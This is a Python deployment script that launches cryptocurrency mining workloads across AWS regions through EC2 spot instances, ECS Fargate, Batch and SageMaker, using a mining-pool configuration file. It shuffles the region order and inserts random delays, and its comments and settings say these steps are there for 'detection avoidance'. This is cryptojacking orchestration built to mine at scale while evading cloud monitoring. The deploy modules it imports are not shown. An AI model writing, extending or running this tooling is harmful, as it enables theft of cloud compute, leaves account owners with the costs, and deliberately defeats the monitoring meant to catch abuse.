import json, logging
import os
import sys
import time
import random
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from deploy import (
    deploy_ec2, deploy_ecs_fargate, deploy_batch, deploy_sagemaker
)
from utils.resource_tracker import tracker

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def main():
    with open("config/qualified_regions.json") as f:
        qualified = json.load(f)["regions"]
    with open("config/fleet_settings.json") as f:
        settings = json.load(f)
    with open("config/mining_pools.json") as f:
        mining_conf = json.load(f)

    # Deploy in random order for detection avoidance
    random.shuffle(qualified)

    for region in qualified:
        logger.info(f"Deploying in region: {region}")
        
        # Add random delay between regions
        if settings.get('detection_avoidance', {}).get('random_delays', False):
            delay = random.uniform(5, 15)
            logger.info(f"Random delay before region {region}: {delay:.2f} seconds")
            time.sleep(delay)
        
        for service, deploy_func, count_key in [
            ('EC2', deploy_ec2, "spot_instances"),
            ('ECS Fargate', deploy_ecs_fargate, "ecs_tasks"),
            ('Batch', deploy_batch, "batch_jobs"),
            ('SageMaker', deploy_sagemaker, "sagemaker_instances")
        ]:
            try:
                deploy_func.deploy(region, settings.get(count_key, 0), mining_conf, tracker.get_all_resources())
            except Exception as e:
                logger.error(f"{service} deployment failed in {region}: {e}")
                # Optionally, log exception stack trace for more detail
                import traceback
                traceback.print_exc()
                # Continue to next service/region regardless of failure

    logger.info("Deployment completed (some individual services/regions may have failed).")

if __name__ == "__main__":
    main()